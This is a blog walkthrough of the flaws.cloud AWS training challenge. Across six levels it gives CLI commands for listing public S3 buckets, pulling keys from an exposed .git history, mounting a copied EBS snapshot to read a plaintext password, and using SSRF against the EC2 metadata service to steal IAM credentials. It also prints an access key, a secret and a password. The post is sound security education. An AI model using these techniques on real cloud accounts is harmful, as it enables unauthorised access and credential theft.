+++
title = 'Hands on Cloud Pentesting: 3 - flaws.cloud'
date = 2025-06-09T15:47:20+05:30
draft = false
series = "Hands on Cloud Pentesting"
tags = ["cloud","aws"]
+++


<!--more-->

## Introduction
[http://flaws.cloud/](http://flaws.cloud/) is a series of cloud focused challenges which anyone can use to get hands on experience with a few AWS specific issues. I worked my way through this a while back, albeit heavily reliant on hints to make progress, but now I'd like to revisit this once again along with flaws2 which I haven't tried yet. The site does a very good job of providing a walkthrough like experience so that even folks with less experience with the cloud can learn and I'd recommend you give it a go for sure.

## Level 1

### Description
This level is *buckets* of fun. See if you can find the first sub-domain.

### Solution
Each level in this series is a subdomain so our first task is to find the subdomain for the next level. 

The description for this level mentions S3 buckets and if you look at the response headers for the request, we can see that the Server the site is being hosted on is "AmazonS3".
![server  header](image.png)
S3 buckets have a common url format like `http://your-bucket-name.s3.amazonaws.com/path/to/file.txt` which we can modify with our scenario to see if it is misconfigured and public access is allowed
```html
http://flaws.cloud.s3.amazonaws.com/
```
![public access](image-1.png)
The bucket is publicly accessible and we can see the list of objects in the bucket. `secret-dd02c7c.html` this object seems interesting and if we visit [http://flaws.cloud/secret-dd02c7c.html](http://flaws.cloud/secret-dd02c7c.html) we get the url for level 2
![level2 found](image-2.png)
> Level 2 = [http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/](http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/)

## Level 2

### Description
The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the free tier.

### Solution
This time, the description explicitly mentions that we need to use an AWS account. Lets try using AWSCli to see if there are any differences when listing the bucket with a configured profile and without a profile.

![level2 listing](SCR-20250609-ojfe.png)
We don't seem to have public list access, hence the `--no-sign-request` command failed but with any other authenticated AWS profile configured, we are able to see the listing.

Going to the url `http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html` gives us the Level 3 url.

> Level 3 = [http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/](http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/)

## Level 3

### Description
The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are.

### Solution
Once again, lets try to list the contents of the bucket.
![level3 listing](image-3.png)

This time, the .git folder stands out as suspicious. Using the following command, we can copy the entire contents of the .git folder.
```bash
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git . --profile <your_aws_profile>
```
Then using the `git` command we can see that there were 2 commits
![git commits](image-4.png)
We can use the following command to see the file changes that have been made in the commit.
```bash
git show b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
```
![got access key](image-5.png)
This reveals an access key and secret using which we can setup another profile.
![configure access key](image-6.png)
Then we can use the following command to list all the s3 buckets for this user
```bash
aws s3 ls --profile flawslvl3
```
![level4 url](image-7.png)
This reveals the url for Level 4
> Level 4 = [http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/](http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/)

## Level 4

### Description
For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it.

### Solution
Visiting the given link [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/) prompts us with a basic http auth sign in prompt for which we have to find a username and password.

The description mentions EC2 snapshots so lets take a look at the ec2 instances that our profile has access to. The default region of us-east-1 does not have any instances listed but when you ping the given EC2 ip you can see that it is mapped to us-west-2 region and listing instances there gives us an active one. We can view the snapshots using the following command
```bash
aws ec2 describe-snapshots --profile flawslvl3 --owner-ids self --region us-west-2
```
![view snapshots](image-8.png)

{{< details summary="note about cost of copying snapshot" >}}
![cost breakdown](image-19.png)
A cost of USD 0.3 did show up in my billing console just because I transfered the snapshot across regions. USD 0.01 was also charged for SnapshotAPIUnits which is a result of running dsnap to download the snapshot

There is an alternative way to solve this by just running your own EC2 on us-west-2 and mounting the snapshot on that instead of downloading the snapshot and most probably that will not end up costing anything if you are on the free tier.
{{< /details >}}

Using a tool like [dsnap](https://github.com/RhinoSecurityLabs/dsnap) we can download the snapshot but the tool does not work for public snapshots so first we have to copy the snapshot onto our own account using the command
```bash
aws ec2 copy-snapshot --source-region <source_region> --source-snapshot-id <snapshot_id> --description "copy of snapshot" --region us-east-1 --profile <your_profile_name>
```
After a few seconds we can see the snapshot in our profile
![snapshot copied](image-9.png)
Then we can use the following command to download the .img file
```bash
dsnap --region us-east-1 --profile <your_profile_name> get <snapshot_id>
```

Once the img file is downloaded, we can mount it into our file system.
```bash
fdisk -l snap-02e631ecebf18e704.img # Find the partition start

sudo mkdir /mnt/snap

sudo mount -o loop,offset=$((16065*512)) snap-02e631ecebf18e704.img /mnt/snap # 512 sector size, 16065 partition start
```
![file system](image-10.png)

Now we can search in /mnt/snap for the username and password to login to the site. In the home folder, under ubuntu, we can find a file called `setupNginx.sh` in which we see the username and password
![username password found](image-11.png)
```html
flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
```
Using this we can login to the website and it gives us the url for the next level

> Level 5 = [http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/](http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/)


## Level 5

### Description
This EC2 has a simple HTTP only proxy on it. Here are some examples of it's usage:
```html
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/
```
See if you can use this proxy to figure out how to list the contents of the level6 bucket at level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud that has a hidden directory in it.

### Solution
The given EC2 url acts as a proxy.
![example proxy usage](image-12.png)

This leads us to one of the most common exploitation techniques in AWS exploitation - [https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/](https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/)
![vulnerable proof](image-13.png)
And sure enough, its vulnerable and we can access the Instance Metadata Service. Using this we can retreive credentials and use that to configure a new profile.
```bash
curl "http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws"
```
![get credentials](image-14.png)
![configure profile](image-15.png)
Using this new profile we can list the level 6 bucket to find the hidden directory
```bash
aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud --profile flawslvl5
```
![hidden directory](image-16.png)

> Level 6 = [http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/](http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/)

## Level 6

### Description
For this final challenge, you're getting a user access key that has the SecurityAudit policy attached to it. See what else it can do and what else you might find in this AWS account.
Access key ID: AKIAJFQ6E7BY57Q3OBGA
Secret: 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

### Solution
After setting up the new profile lets enumerate the iam users and roles.
```bash
aws iam list-users --profile flawslvl6
```
![list users](image-17.png)
```bash
aws iam list-roles --profile flawslvl6

...
# Ignoring AWS Service roles
{
    "Path": "/",
    "RoleName": "flaws",
    "RoleId": "AROAI3DXO3QJ4JAWIIQ5S",
    "Arn": "arn:aws:iam::975426262029:role/flaws",
    "CreateDate": "2017-02-12T20:09:59Z",
    "AssumeRolePolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {
                    "Service": "ec2.amazonaws.com"
                },
                "Action": "sts:AssumeRole"
            }
        ]
    },
    "MaxSessionDuration": 3600
},
{
    "Path": "/service-role/",
    "RoleName": "Level6",
    "RoleId": "AROAILILKPIXVFUB452K2",
    "Arn": "arn:aws:iam::975426262029:role/service-role/Level6",
    "CreateDate": "2017-02-27T00:24:27Z",
    "AssumeRolePolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {
                    "Service": "lambda.amazonaws.com"
                },
                "Action": "sts:AssumeRole"
            }
        ]
    },
    "MaxSessionDuration": 3600
},
{
    "Path": "/",
    "RoleName": "tests3access",
    "RoleId": "AROA6GG7PSQG6HB7L7EXY",
    "Arn": "arn:aws:iam::975426262029:role/tests3access",
    "CreateDate": "2020-10-06T21:13:18Z",
    "AssumeRolePolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {
                    "AWS": "arn:aws:iam::954574370272:root"
                },
                "Action": "sts:AssumeRole",
                "Condition": {}
            }
        ]
    },
    "MaxSessionDuration": 3600
}
...
```
There is a `backup` user which seems interesting and a few different roles. Next lets take a look at the policies, specifically the policy mentioned in the description, `MySecurityAudit` policy.
```bash
 aws iam get-policy-version --profile flawslvl6 --policy-arn "arn:aws:iam::975426262029:policy/MySecurityAudit" --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "acm:Describe*",
                        "acm:List*",
                        "application-autoscaling:Describe*",
                        "athena:List*",
                        "autoscaling:Describe*",
                        "batch:DescribeComputeEnvironments",
                        "batch:DescribeJobDefinitions",
                        "clouddirectory:ListDirectories",
                        "cloudformation:DescribeStack*",
                        "cloudformation:GetTemplate",
                        "cloudformation:ListStack*",
                        "cloudformation:GetStackPolicy",
                        "cloudfront:Get*",
                        "cloudfront:List*",
                        "cloudhsm:ListHapgs",
                        "cloudhsm:ListHsms",
                        "cloudhsm:ListLunaClients",
                        "cloudsearch:DescribeDomains",
                        "cloudsearch:DescribeServiceAccessPolicies",
                        "cloudtrail:DescribeTrails",
                        "cloudtrail:GetEventSelectors",
                        "cloudtrail:GetTrailStatus",
                        "cloudtrail:ListTags",
                        "cloudwatch:Describe*",
                        "codebuild:ListProjects",
                        "codedeploy:Batch*",
                        "codedeploy:Get*",
                        "codedeploy:List*",
                        "codepipeline:ListPipelines",
                        "codestar:Describe*",
                        "codestar:List*",
                        "cognito-identity:ListIdentityPools",
                        "cognito-idp:ListUserPools",
                        "cognito-sync:Describe*",
                        "cognito-sync:List*",
                        "datasync:Describe*",
                        "datasync:List*",
                        "dax:Describe*",
                        "dax:ListTags",
                        "directconnect:Describe*",
                        "dms:Describe*",
                        "dms:ListTagsForResource",
                        "ds:DescribeDirectories",
                        "dynamodb:DescribeContinuousBackups",
                        "dynamodb:DescribeGlobalTable",
                        "dynamodb:DescribeTable",
                        "dynamodb:DescribeTimeToLive",
                        "dynamodb:ListBackups",
                        "dynamodb:ListGlobalTables",
                        "dynamodb:ListStreams",
                        "dynamodb:ListTables",
                        "ec2:Describe*",
                        "ecr:DescribeRepositories",
                        "ecr:GetRepositoryPolicy",
                        "ecs:Describe*",
                        "ecs:List*",
                        "eks:DescribeCluster",
                        "eks:ListClusters",
                        "elasticache:Describe*",
                        "elasticbeanstalk:Describe*",
                        "elasticfilesystem:DescribeFileSystems",
                        "elasticloadbalancing:Describe*",
                        "elasticmapreduce:Describe*",
                        "elasticmapreduce:ListClusters",
                        "elasticmapreduce:ListInstances",
                        "es:Describe*",
                        "es:ListDomainNames",
                        "events:DescribeEventBus",
                        "events:ListRules",
                        "firehose:Describe*",
                        "firehose:List*",
                        "fsx:Describe*",
                        "fsx:List*",
                        "gamelift:ListBuilds",
                        "gamelift:ListFleets",
                        "glacier:DescribeVault",
                        "glacier:GetVaultAccessPolicy",
                        "glacier:ListVaults",
                        "globalaccelerator:Describe*",
                        "globalaccelerator:List*",
                        "greengrass:List*",
                        "guardduty:Get*",
                        "guardduty:List*",
                        "iam:GenerateCredentialReport",
                        "iam:Get*",
                        "iam:List*",
                        "iam:SimulateCustomPolicy",
                        "iam:SimulatePrincipalPolicy",
                        "iot:Describe*",
                        "iot:List*",
                        "kinesis:DescribeStream",
                        "kinesis:ListStreams",
                        "kinesis:ListTagsForStream",
                        "kinesisanalytics:ListApplications",
                        "kms:Describe*",
                        "kms:List*",
                        "lambda:GetAccountSettings",
                        "lambda:GetPolicy",
                        "lambda:List*",
                        "license-manager:List*",
                        "logs:Describe*",
                        "logs:ListTagsLogGroup",
                        "machinelearning:DescribeMLModels",
                        "mediaconnect:Describe*",
                        "mediaconnect:List*",
                        "mediastore:GetContainerPolicy",
                        "mediastore:ListContainers",
                        "opsworks-cm:DescribeServers",
                        "organizations:List*",
                        "quicksight:Describe*",
                        "quicksight:List*",
                        "ram:List*",
                        "rds:Describe*",
                        "rds:DownloadDBLogFilePortion",
                        "rds:ListTagsForResource",
                        "redshift:Describe*",
                        "rekognition:Describe*",
                        "rekognition:List*",
                        "robomaker:Describe*",
                        "robomaker:List*",
                        "route53:Get*",
                        "route53:List*",
                        "route53domains:GetDomainDetail",
                        "route53domains:GetOperationDetail",
                        "route53domains:ListDomains",
                        "route53domains:ListOperations",
                        "route53domains:ListTagsForDomain",
                        "route53resolver:List*",
                        "s3:ListAllMyBuckets",
                        "sagemaker:Describe*",
                        "sagemaker:List*",
                        "sdb:DomainMetadata",
                        "sdb:ListDomains",
                        "securityhub:Get*",
                        "securityhub:List*",
                        "serverlessrepo:GetApplicationPolicy",
                        "serverlessrepo:List*",
                        "sqs:GetQueueAttributes",
                        "sqs:ListQueues",
                        "ssm:Describe*",
                        "ssm:ListDocuments",
                        "storagegateway:List*",
                        "tag:GetResources",
                        "tag:GetTagKeys",
                        "transfer:Describe*",
                        "transfer:List*",
                        "translate:List*",
                        "trustedadvisor:Describe*",
                        "waf:ListWebACLs",
                        "waf-regional:ListWebACLs",
                        "workspaces:Describe*"
                    ],
                    "Resource": "*",
                    "Effect": "Allow"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2019-03-03T16:42:45Z"
    }
}
```

We have various permissins like ec2 describe, iam get, list etc.

Apart from that there another policy, which we can see using `list-attached-user-policies`, called `list_apigateways`
```bash
aws iam get-policy-version --profile flawslvl6 --policy-arn "arn:aws:iam::975426262029:policy/list_apigateways" --version-id v4
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "apigateway:GET"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:apigateway:us-west-2::/restapis/*"
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2017-02-20T01:48:17Z"
    }
}
```
This policy allows read only requests to restapis.

Looking at the ec2 describe instances command, we can see that there is an instance running but its the same one used in a previous challenge and does not seem to have anything more. Listing the lambda functions shows that there is a function called "Level6"
```bash
aws lambda list-functions --profile flawslvl6 --region us-west-2
{
    "Functions": [
        {
            "FunctionName": "Level6",
            "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
            "Runtime": "python2.7",
            "Role": "arn:aws:iam::975426262029:role/service-role/Level6",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 282,
            "Description": "A starter AWS Lambda function.",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2017-02-27T00:24:36.054+0000",
            "CodeSha256": "2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "d45cc6d9-f172-4634-8d19-39a20951d979",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            },
            "LoggingConfig": {
                "LogFormat": "Text",
                "LogGroup": "/aws/lambda/Level6"
            }
        }
    ]
}
```
We don't have permission to get function but we can do `lambda:GetPolicy`
```bash
aws lambda get-policy --profile flawslvl6 --region us-west-2 --function-name Level6
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",\"Condition\":{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"}}}]}",
    "RevisionId": "edaca849-06fb-4495-a09c-3bc6115d3b87"
}
```
The Policy formatted:
```json
{
    "Version":"2012-10-17",
    "Id":"default",
    "Statement":[
        {
            "Sid":"904610a93f593b76ad66ed6ed82c0a8b",
            "Effect":"Allow",
            "Principal":{
                "Service":"apigateway.amazonaws.com"
                },
                "Action":"lambda:InvokeFunction",
                "Resource":"arn:aws:lambda:us-west-2:975426262029:function:Level6",
                "Condition":{
                    "ArnLike":{
                        "AWS:SourceArn":"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6"
                    }
                }
        }
    ]
}
```
This gives us a api gateway path with rest-api-id "s33ppypa75". Using this we can list the Resources.
```bash
aws apigateway get-resources --profile flawslvl6 --region us-west-2 --rest-api-id s33ppypa75
{
    "items": [
        {
            "id": "6m5gni",
            "parentId": "y8nk5v2z1h",
            "pathPart": "level6",
            "path": "/level6",
            "resourceMethods": {
                "GET": {}
            }
        },
        {
            "id": "y8nk5v2z1h",
            "path": "/"
        }
    ]
}
```
Then get the stage name
```bash
aws apigateway get-stages --profile flawslvl6 --region us-west-2 --rest-api-id s33ppypa75
```
And now the api url can be crafted with the stage name, path and resource id we have - [https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6](https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6)

We can see what the api does using the following command
```bash
aws apigateway get-method --rest-api-id s33ppypa75 --resource-id 6m5gni --http-method GET --region us-west-2 --profile flawslvl6
{
    "httpMethod": "GET",
    "authorizationType": "NONE",
    "apiKeyRequired": false,
    "requestParameters": {},
    "methodResponses": {
        "200": {
            "statusCode": "200",
            "responseModels": {
                "application/json": "Empty"
            }
        }
    },
    "methodIntegration": {
        "type": "AWS",
        "httpMethod": "POST",
        "uri": "arn:aws:apigateway:us-west-2:lambda:path/2015-03-31/functions/arn:aws:lambda:us-west-2:975426262029:function:Level6/invocations",
        "passthroughBehavior": "WHEN_NO_MATCH",
        "contentHandling": "CONVERT_TO_TEXT",
        "timeoutInMillis": 29000,
        "cacheNamespace": "6m5gni",
        "cacheKeyParameters": [],
        "integrationResponses": {
            "200": {
                "statusCode": "200",
                "responseTemplates": {
                    "application/json": null
                }
            }
        }
    }
}
```
It internally makes a post request to the lambda function.

Visting the api url gives the final link
![final link](image-18.png)

> The end = http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/